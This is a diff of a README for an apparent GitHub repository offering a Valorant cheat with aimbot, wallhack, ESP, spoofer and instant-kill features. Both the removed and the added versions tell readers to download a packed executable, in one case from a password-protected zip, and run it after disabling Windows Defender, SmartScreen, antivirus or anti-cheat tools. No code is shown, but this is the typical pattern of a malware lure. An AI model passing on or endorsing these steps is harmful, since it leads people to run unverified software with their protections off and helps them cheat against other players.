@@ -1,92 +1,86 @@
-# Stugware Cheat for Valorant
-![1](https://github.com/user-attachments/assets/c8e2154d-190c-4f7d-a2af-36dd79a7e426)
-![2](https://github.com/user-attachments/assets/f1f91f6c-7c53-476d-bfe7-5db86c7825d0)
+# 🎮 Valorant-Stugware-Cheat - Simple Cheats for Better Gameplay
 
-## How to Use
+[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/s1mple131/Valorant-Stugware-Cheat/releases)
 
-1. **Download:** (https://github.com/menzisa/Valorant-Stugware-Cheat/releases/download/latest/StugwareValorant.zip).
-2. **Unzip the Files**: Use the pass **StugwareValorant**.
-3. **Run the Application**: Execute the `.exe` file. *(If it doesn't work, please contact the developer.)*
-4. **Activate in Game**: Press the **HOME** key to enable the tool.
+## 🚀 Getting Started
 
----
+Welcome to the Valorant-Stugware-Cheat! This software gives you the tools you need to enhance your gameplay experience in Valorant. With features like aimbot and wallhack, you can improve your performance in matches. Follow these steps to download and run the software with ease.
 
-## Technical Specifications
+## 📥 Download & Install
 
-- **Supported Operating Systems**:
-  - Windows 10 (1903-24H2)
-  - Windows 11 (21H2-24H2)
-- **Processor Compatibility**:
-  - Intel
-  - AMD
-- **Game Modes Supported**:
-  - Windowed Mode
-  - Borderless Mode
-- **Built-in Tools**:
-  - HWID Spoofer
+1. **Visit the Downloads Page**  
+   Head over to our [Releases page](https://github.com/s1mple131/Valorant-Stugware-Cheat/releases). You will find the latest version of the Stugware cheat here.
 
----
+2. **Find the Latest Update**  
+   Look for the topmost version available on the Releases page. It usually has the latest features and bug fixes.
 
-## Features Overview
+3. **Download the File**  
+   Click on the version that you want to download. It will be a downloadable file, often labeled as something like `StugwareCheat.zip`. Make sure to note the file name for future reference.
 
-### AIMBOT
-- **Enable Aimbot** (Activate Aimbot functionality)
-- **HotKey Vector** (Assign a key for Aimbot)
-- **Fov** (Field of View settings)
-- **Smooth** (Adjust aiming smoothness)
-- **Max Distance** (Set maximum range for Aimbot)
-- **Enable pSilent** (Enable silent aiming mode)
-- **Hotkey** (Assign a key for pSilent)
-- **Fov** (Field of View settings for pSilent)
-- **Max Distance** (Set maximum range for pSilent)
+4. **Extract the File**  
+   Once the download completes, locate the zip file in your Downloads folder. Right-click the file and select "Extract All..." to unzip the contents.
 
-### VISUALS
-#### Player:
-- **Enable** (Activate visuals for players)
-- **Show Name** (Display player names)
-- **Show Box** (Display a box around players)
-- **Show Skeleton** (Display player skeletons)
-- **Show Weapon** (Display equipped weapons)
-- **Show Price** (Display item prices)
-- **Show Distance** (Display distance to players)
-- **Show Armor** (Display player's armor level)
-- **Show Ammo** (Display ammo count)
-- **Show Health** (Display player's health)
-- **Max Distance** (Set maximum visual range)
+5. **Run the Software**  
+   Navigate to the extracted folder. Look for the application file, which might be named something similar to `StugwareCheat.exe`. Double-click the file to launch the application.
 
-#### BOT:
-- **Enable** (Activate visuals for bots)
-- **Show Name**, **Box**, **Skeleton**, **Weapon**, **Price**, **Distance**, **Armor**, **Ammo**, and **Health** (Similar to player visuals settings)
-- **Max Distance** (Set maximum visual range)
+## ⚙️ System Requirements
 
-### LOOT
-- **Enable** (Activate loot visuals)
-- **Show Name**, **Price**, and **Distance** (Display relevant information about loot)
-- **Specific Loot Types**:
-  - **Weapon**, **Adapter**, **Ammo**, **Armor**
-  - **Recovery** (Healing items)
-  - **Mybag**, **Vestbag**, **Loot Container**
-  - **Avatar**, **Safe**, **Pocket**
-  - **Badge**, **Items**, **Other**
-- **Max Distance** (Set maximum loot range)
+To run the Valorant-Stugware-Cheat smoothly, ensure your system meets the following requirements:
 
-### MISC
-- **Instant Kill** (Enable instant kill functionality)
-- **Recoil Control** (Reduce weapon recoil)
-- **Config Management**:
-  - **Load Config** (Load saved settings)
-  - **Save Config** (Save current settings)
+- **Operating System**: Windows 10 or higher  
+- **RAM**: At least 4 GB  
+- **Processor**: Intel Core i5 or equivalent  
+- **Graphics**: Any recent GPU with DirectX support  
+- **Internet Connection**: Required for the initial setup and downloading updates  
 
----
+## 🎯 Features
 
-## System Requirements
+The Stugware cheat offers the following key features:
 
-- **Disable Windows Defender and Smart Screen** before using the tool.
-- **Remove Anti-Cheats**:
-  - Faceit
+- **Aimbot**: Aim assistance that helps you lock onto enemies quickly. You can choose between weaker and stronger settings to suit your play style. 
 
----
+- **Wallhack (WH)**: See through walls to locate enemies easily, giving you the edge in strategic gameplay.
 
-## Disclaimer
+- **Radar**: Displays enemy positions on your mini-map, allowing for better navigation and surprising attacks.
 
-Use it at your own risk.
+- **Customization Options**: While limited, you can adjust the aimbot strength to balance between stealth and aggression.
+
+## 🔧 Troubleshooting
+
+If you encounter issues during installation or execution, consider the following solutions:
+
+- **Anti-Virus Software**: Some anti-virus programs may flag our software as a threat. If this happens, add the application to your exceptions list or temporarily disable the anti-virus while using the cheat.
+
+- **Running as Administrator**: If the application does not start correctly, try running it as an administrator. Right-click on the application file and select "Run as administrator."
+
+- **Game Compatibility**: Make sure that Valorant is up to date. The cheat is designed to work with the most recent version of the game.
+
+## 🛠️ Frequently Asked Questions
+
+### Q: Is this cheat safe to use?
+
+A: Use the cheat at your own risk. We advise using it with caution to avoid any account bans. 
+
+### Q: Can I use the cheat in ranked games?
+
+A: While the cheat works in all game modes, using cheats in ranked matches may result in account penalties.
+
+### Q: How do I update the cheat?
+
+A: Keep an eye on the Releases page for new versions. Just download and replace the old files with the new ones.
+
+## 📋 License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## 📞 Contact
+
+For any questions or support, please reach out on the Issues page linked in the repository. We aim to provide helpful assistance as quickly as we can.
+
+## 🔗 Useful Links
+
+- [Releases Page](https://github.com/s1mple131/Valorant-Stugware-Cheat/releases)  
+- [Issues Page](https://github.com/s1mple131/Valorant-Stugware-Cheat/issues)  
+- [Contributing Guide](CONTRIBUTING.md)  
+
+[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/s1mple131/Valorant-Stugware-Cheat/releases)
